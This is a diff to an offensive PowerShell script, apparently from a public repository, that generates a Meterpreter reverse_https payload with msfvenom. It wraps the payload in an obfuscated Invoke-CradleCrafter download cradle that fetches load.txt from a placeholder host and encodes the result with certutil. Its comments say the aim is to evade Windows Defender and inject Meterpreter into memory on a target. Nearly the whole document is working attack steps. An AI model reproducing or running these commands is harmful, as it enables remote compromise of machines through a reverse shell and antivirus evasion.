@@ -12,16 +12,16 @@ tripping defender from invoke-cradlecrafter
 I also use WSL in this script for interoperability between Win & Kali
 
 #>
-
 # Generate Payload
-& "$env:windir\system32\wsl.exe" msfvenom -p windows/x64/meterpreter/reverse_https LHOST=http://0.0.0.0/ LPORT=443 -e cmd/powershell_base64 -f psh -o load.txt
+$1 = 'msfvenom -p windows/x64/meterpreter/reverse_https LHOST=http://0.0.0.0/ LPORT=443 -e cmd/powershell_base64 -f psh -o load.txt'
+wsl $1
 # After this place your generated payload in a web content server folder
 # Importing Cradle Crafter, at the prompt set your IP which was set in the msfvenom payload
-ipmo Invoke-CradleCrafter; Invoke-CradleCrafter -Url 'http://0.0.0.0//load.txt' -Command 'Memory\*\All\1,OUT C:\raw.txt' -Quiet
+ipmo Invoke-CradleCrafter; Invoke-CradleCrafter -Url 'http://0.0.0.0/load.txt' -Command 'Memory\*\All\1,OUT C:\raw.txt' -Quiet
 <##################################
 # ALERNATIVE
 #ipmo .\Invoke-CradleCrafter.psd1  ; Invoke-CradleCrafter
-# SET URL http://0.0.0.0//load.txt
+# SET URL http://0.0.0.0/load.txt
 # MEMORY
 # CERTUTIL
 # ALL
@@ -37,7 +37,7 @@ ipmo Invoke-CradleCrafter; Invoke-CradleCrafter -Url 'http://0.0.0.0//load.txt' 
           You will encode this file in base64 using the certutil to create a file called cert.cer and place it on a webserver.
            We will then construct a one-liner that will be called remotely to pull down this file and get it executed on the target. Once it executes it will call our payload load.txt and inject Meterpreter via PowerShell into memory. 
 #>
-certutil.exe -encode raw.txt cert.cer
+certutil.exe -encode C:\raw.txt C:\cert.cer
 # Place your cert.cer in your payload directory where the server is hosted
 # I'm going to comment an example of me doing this in wsl from windows
 <#
@@ -78,5 +78,3 @@ TB+njZ86a0vayOhiodOZK2+0SNWhY7lsb5/Sg5TRbKILn8t3AwDFVmM9lIbMyRc/
 Rx8tZek/qzWAghbyUc/a
 =Ae+7
 -----END PGP SIGNATURE-----
-
-#>
